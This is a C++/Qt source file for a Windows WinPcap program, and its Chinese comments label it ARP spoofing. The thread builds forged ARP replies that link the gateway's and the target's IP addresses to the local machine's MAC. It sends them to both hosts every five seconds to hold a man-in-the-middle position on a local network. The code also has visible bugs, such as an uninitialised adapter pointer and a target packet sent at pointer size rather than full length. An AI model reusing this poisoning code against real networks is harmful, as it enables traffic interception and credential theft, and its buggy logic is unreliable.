#include "arpthread.h"
#include "protocol.h"
#include <QNetworkInterface>
#include <iostream>
#include <stdio.h>
#include <pcap.h>
#include <conio.h>
#include <Packet32.h>
#define OID_802_11_BSSID_LIST_SCAN 0x0D01011A
#define OID_802_3_PERMANENT_ADDRESS 0x01010101
#define OID_802_3_CURRENT_ADDRESS 0x01010102


ArpThread::ArpThread()
{
    isStop=false;
    //获取当前有效网卡
    qDebug()<<d->name;
    mac=GetSelfMac(d->name);
    qDebug("发送ARP欺骗包，本机mac(%.2X-%.2X-%.2X-%.2X-%.2X-%.2X)\n",mac[0],mac[1],mac[2],mac[3],mac[4],mac[5]);

}


//获取本地mac地址
unsigned char* ArpThread::GetSelfMac(char* pDevName){

    static u_char mac[6];

    memset(mac,0,sizeof(mac));

    LPADAPTER lpAdapter = PacketOpenAdapter(pDevName);

    if (!lpAdapter || (lpAdapter->hFile == INVALID_HANDLE_VALUE))
    {
    return NULL;
    }

    PPACKET_OID_DATA OidData = (PPACKET_OID_DATA)malloc(6 + sizeof(PACKET_OID_DATA));
    if (OidData == NULL)
    {
    PacketCloseAdapter(lpAdapter);
    return NULL;
    }

    OidData->Oid = OID_802_3_CURRENT_ADDRESS;

    OidData->Length = 6;
    memset(OidData->Data, 0, 6);
    BOOLEAN Status = PacketRequest(lpAdapter, FALSE, OidData);
    if(Status)
    {
    memcpy(mac,(u_char*)(OidData->Data),6);
    }
    free(OidData);
    PacketCloseAdapter(lpAdapter);
    return mac;

}


void ArpThread::run(){
    qDebug()<<"ARP欺骗线程ID："<<currentThreadId();
    const u_char * targetpkt;
    const u_char * gatepkt;
    while(isStop!=true) { 

        targetpkt=BuildArpPacket(mac,gateIP,targetMac,targetIP);
//        for(int n=0;n<42;n++){
//            qDebug()<<typeid(packet).name()<<targetpkt[n];
//        }
        if(pcap_sendpacket(adhandle,targetpkt,sizeof(targetpkt))==-1){
            emit info("failed to send arp packet to target!");
        }else{
            emit info("success to send arp packet to target!");
        }

        gatepkt=BuildArpPacket(mac,targetIP,gateMac,gateIP);
        if(pcap_sendpacket(adhandle,gatepkt,42)==-1){
            emit info("failed to send arp packet to gate!");
        }else{
            emit info("success to send arp packet to gate!");
        }
        sleep(5);
    }
    //free(targetpkt);
    emit info("stop cheating!");


}
void ArpThread::setflag(bool flag)
{
    isStop = flag;
}
const u_char * ArpThread::BuildArpPacket(u_char * current_mac,QString render_IP,QString target_Mac,QString target_IP){
    //qDebug()<<gateMac<<gateIP<<targetMac<<targetIP;
    //qDebug()<<current_Mac<<render_IP<<target_Mac<<target_IP;
    _ethhdr *eth=(_ethhdr*)malloc(sizeof(_ethhdr));
    _arphdr *arph =(_arphdr*)malloc(sizeof(_arphdr));
    QStringList render_iplist = render_IP.split(".");//QString字符串分割函数
    QStringList target_iplist = target_IP.split(".");//
    QStringList target_maclist = target_Mac.split("-");

    /*目标MAC地址存入内存*/
    bool ok;
    if(target_maclist.count()!=6){
       qDebug()<<"请输入正确网卡MAC地址";
    }else{
        for(int n=0;n<6;n++){
            int destmac=target_maclist[n].toInt(&ok,16);
            eth->dest[n]=destmac;
            arph->destMc[n]=destmac;
            //qDebug()<<target_maclist[n]<<mac;
        }
    }

    //拷贝本机MAC地址
    memcpy(eth->src,current_mac,6);
    memcpy(arph->senderMac,current_mac,6);

    /*IP地址存入内存*/
    if(render_iplist.count()!=4){
       qDebug()<<"请输入正确网卡IP地址";
    }else{
        for(int n=0;n<4;n++){
            int senderip=render_iplist[n].toInt();
            arph->senderIP[n]=senderip;
            //qDebug()<<render_iplist[n]<<a<<arph->senderIP[n];
        }
    }
    if(target_iplist.count()!=4){
       qDebug()<<"请输入正确目标IP地址";
    }else{
        for(int n=0;n<4;n++){
            int destip=target_iplist[n].toInt();
            arph->destIP[n]=destip;
            //qDebug()<<target_iplist[n]<<b<<arph->destIP[n];
        }
    }
    /*以太网协议头*/
    eth->type=htons(0x0806);
    /*arp协议头*/
    arph->htype=htons(0x0001);
    arph->ptype=htons(0x0800);
    arph->hsize=0x06;
    arph->prsize=0x04;
    arph->opcode=htons(0x0001);

    _arppkt *arppkt=(_arppkt*)malloc(sizeof(_arppkt));
    arppkt->ethh=eth;
    arppkt->arph=arph;

    memset(packet, 0, sizeof(packet));

    memcpy(packet, arppkt->ethh,14);
    memcpy(packet+14, arppkt->arph,28);

    free(arppkt);
    free(eth);
    free(arph);
    return (const u_char*)packet;
}

void ArpThread::MacIp(QString target_Mac,QString target_IP,QString gate_Mac,QString gate_IP){
     gateMac=gate_Mac;
     gateIP=gate_IP;
     targetMac=target_Mac;
     targetIP=target_IP;
     QStringList target_maclist = target_Mac.split("-");
     QStringList gatemac_maclist = gate_Mac.split("-");
     QStringList gate_iplist = gate_IP.split(".");//QString字符串分割函数
     QStringList target_iplist = target_IP.split(".");//

     /*转发MAC地址存入内存*/
     bool ok;
     if(target_maclist.count()!=6){
        qDebug()<<"请输入正确网卡MAC地址";
     }else{
         for(int n=0;n<6;n++){
             int s_targetmac=target_maclist[n].toInt(&ok,16);
             int s_gatemac=gatemac_maclist[n].toInt(&ok,16);
             send_targetmac[n]=s_targetmac;
             send_gatemac[n]=s_gatemac;
             //qDebug()<<send_targetmac[n]<<send_gatemac[n];
         }
     }
    /*转发IP地址存入内存*/
     if(gate_iplist.count()!=4){
        qDebug()<<"请输入正确网卡IP地址";
     }else{
         for(int n=0;n<4;n++){
             int s_targetip=target_iplist[n].toInt();
             int s_gateip=gate_iplist[n].toInt();
             send_targetip[n]=s_targetip;
             send_gateip[n]=s_gateip;
             //qDebug()<<send_targetip[n]<<send_gateip[n];
         }
     }
}
